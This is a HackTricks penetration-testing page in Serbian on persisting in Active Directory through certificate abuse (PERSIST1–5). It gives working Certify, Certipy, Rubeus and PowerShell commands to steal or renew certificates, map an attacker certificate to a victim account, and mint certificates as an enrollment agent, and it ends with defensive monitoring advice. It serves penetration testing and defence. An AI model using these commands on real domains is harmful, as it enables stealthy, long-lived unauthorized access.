# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je kratak pregled poglavlja o postojanju naloga iz sjajnog istraživanja sa [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Razumevanje krađe korisničkih akreditiva aktivnih korisnika pomoću sertifikata – PERSIST1

U scenariju gde korisnik može da zatraži sertifikat koji omogućava autentifikaciju domena, napadač ima priliku da zatraži i ukrade ovaj sertifikat kako bi održao postojanost na mreži. Po defaultu, `User` šablon u Active Directory-ju omogućava takve zahteve, iako može ponekad biti onemogućen.

Koristeći [Certify](https://github.com/GhostPack/Certify) ili [Certipy](https://github.com/ly4k/Certipy), možete pretraživati omogućene šablone koji dozvoljavaju autentifikaciju klijenata i zatim zatražiti jedan:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Moć sertifikata leži u njegovoj sposobnosti da autentifikuje kao korisnik kojem pripada, bez obzira na promene lozinke, sve dok sertifikat ostaje važeći.

Možete konvertovati PEM u PFX i koristiti ga za dobijanje TGT-a:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Napomena: U kombinaciji sa drugim tehnikama (vidi odeljke o KRAĐI), autentifikacija zasnovana na sertifikatima omogućava trajni pristup bez dodirivanja LSASS-a i čak iz neuzdignutih konteksta.

## Sticanje trajnosti mašine pomoću sertifikata - PERSIST2

Ako napadač ima uzdignute privilegije na hostu, može registrovati kompromitovani sistemski račun mašine za sertifikat koristeći podrazumevani `Machine` šablon. Autentifikacija kao mašina omogućava S4U2Self za lokalne usluge i može obezbediti trajnu postojanost hosta:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Produženje Postojanosti Kroz Obnovu Sertifikata - PERSIST3

Zloupotreba perioda važenja i obnove šablona sertifikata omogućava napadaču da održi dugoročni pristup. Ako posedujete prethodno izdat sertifikat i njegov privatni ključ, možete ga obnoviti pre isteka kako biste dobili svež, dugotrajan kredencijal bez ostavljanja dodatnih artefakata zahteva povezanih sa originalnim principalom.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operativni savet: Pratite trajanje PFX datoteka koje drži napadač i obnavljajte ih unapred. Obnova može takođe uzrokovati da ažurirani sertifikati uključuju modernu SID mapiranje ekstenziju, čineći ih upotrebljivim pod strožim DC pravilima mapiranja (vidi sledeću sekciju).

## Postavljanje Eksplicitnih Sertifikat Mapa (altSecurityIdentities) – PERSIST4

Ako možete da pišete u `altSecurityIdentities` atribut ciljnog naloga, možete eksplicitno mapirati sertifikat pod kontrolom napadača na taj nalog. Ovo ostaje aktivno i nakon promena lozinke i, kada se koriste jaki formati mapiranja, ostaje funkcionalno pod modernim DC sprovođenjem.

Visok nivo toka:

1. Nabavite ili izdate klijent-auth sertifikat koji kontrolišete (npr. upišite `User` šablon kao sebe).
2. Izvucite jak identifikator iz sertifikata (Issuer+Serial, SKI, ili SHA1-PublicKey).
3. Dodajte eksplicitno mapiranje na `altSecurityIdentities` žrtvenog principala koristeći taj identifikator.
4. Autentifikujte se sa svojim sertifikatom; DC ga mapira na žrtvu putem eksplicitnog mapiranja.

Primer (PowerShell) koristeći jako Issuer+Serial mapiranje:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Zatim se autentifikujte sa svojim PFX. Certipy će direktno dobiti TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notes
- Koristite samo jake tipove mapiranja: X509IssuerSerialNumber, X509SKI ili X509SHA1PublicKey. Slabi formati (Subject/Issuer, samo Subject, RFC822 email) su zastareli i mogu biti blokirani politikom DC-a.
- Lanac sertifikata mora biti izgrađen do korena koji je poveren DC-u. Preduzeća CAs u NTAuth su obično poverena; neka okruženja takođe veruju javnim CAs.

Za više informacija o slabim eksplicitnim mapiranjima i putevima napada, pogledajte:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent kao Persistencija – PERSIST5

Ako dobijete važeći sertifikat za zahtev za sertifikat/sertifikat agenta za upis, možete kreirati nove sertifikate sposobne za prijavu u ime korisnika po želji i čuvati agenta PFX van mreže kao token za persistenciju. Zloupotreba radnog toka:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Povlačenje sertifikata agenta ili dozvola šablona je potrebno za uklanjanje ove perzistencije.

## 2025 Snažno sprovođenje mapiranja sertifikata: Uticaj na perzistenciju

Microsoft KB5014754 je uveo snažno sprovođenje mapiranja sertifikata na kontrolerima domena. Od 11. februara 2025, DC-ovi podrazumevano koriste potpuno sprovođenje, odbacujući slaba/ambigvna mapiranja. Praktične posledice:

- Sertifikati pre 2022. godine koji nemaju SID mapiranje ekstenziju mogu propasti implicitno mapiranje kada su DC-ovi u potpunom sprovođenju. Napadači mogu održati pristup ili obnavljanjem sertifikata putem AD CS (da bi dobili SID ekstenziju) ili postavljanjem snažnog eksplicitnog mapiranja u `altSecurityIdentities` (PERSIST4).
- Eksplicitna mapiranja koristeći jake formate (Issuer+Serial, SKI, SHA1-PublicKey) nastavljaju da rade. Slabi formati (Issuer/Subject, samo Subject, RFC822) mogu biti blokirani i treba ih izbegavati za perzistenciju.

Administratori bi trebali pratiti i obaveštavati o:
- Promenama u `altSecurityIdentities` i izdavanju/obnavljanju sertifikata za Enrollment Agent i korisnike.
- CA logovima o izdavanju za zahteve u ime i neobičnim obrascima obnavljanja.

## Reference

- Microsoft. KB5014754: Promene u autentifikaciji zasnovanoj na sertifikatima na Windows kontrolerima domena (vremenska linija sprovođenja i jaka mapiranja).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Referenca komandi (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
